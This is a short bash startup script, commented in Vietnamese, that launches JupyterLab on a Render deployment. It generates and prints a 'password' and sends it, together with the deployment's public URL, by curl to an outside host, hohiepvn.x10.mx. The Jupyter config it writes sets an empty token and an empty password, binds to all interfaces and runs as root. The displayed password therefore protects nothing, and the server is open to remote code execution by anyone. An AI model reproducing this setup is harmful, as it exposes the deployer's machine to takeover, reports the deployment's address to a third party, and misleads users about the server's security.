#!/bin/bash
set -e

# === 1. Sinh mật khẩu ngẫu nhiên (12 ký tự) ===
PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 12)

# === 2. Lấy link Render (hoặc localhost khi dev local) ===
LINK="${RENDER_EXTERNAL_URL:-http://localhost:8888}"

# === 3. Gửi mật khẩu và token về API host của Hiệp ===
API_URL="https://hohiepvn.x10.mx/key/input.php"
curl -X POST -s \
    -d "host=${LINK}" \
    -d "password=${PASSWORD}" \
    -d "token=$(date +%s)" \
    "${API_URL}" > /var/log/send_key.log 2>&1 || true

# === 4. Ghi log nội bộ ===
echo "[$(date)] Host: ${LINK} | Password: ${PASSWORD}" >> /var/log/startup.log

# === 5. Tạo cấu hình Jupyter không cần token ===
mkdir -p /root/.jupyter
cat > /root/.jupyter/jupyter_server_config.py <<EOF
c.ServerApp.ip = '0.0.0.0'
c.ServerApp.port = 8888
c.ServerApp.open_browser = False
c.ServerApp.allow_root = True
c.ServerApp.token = ''
c.ServerApp.password = ''
EOF

# === 6. In thông tin ra terminal ===
echo "🚀 JupyterLab đang chạy tại: ${LINK}"
echo "🔐 Mật khẩu: ${PASSWORD}"
echo "📡 Đã gửi về API: ${API_URL}"

# === 7. Khởi động JupyterLab ===
exec python3.12 -m jupyterlab --allow-root --no-browser --ip=0.0.0.0 --port=8888
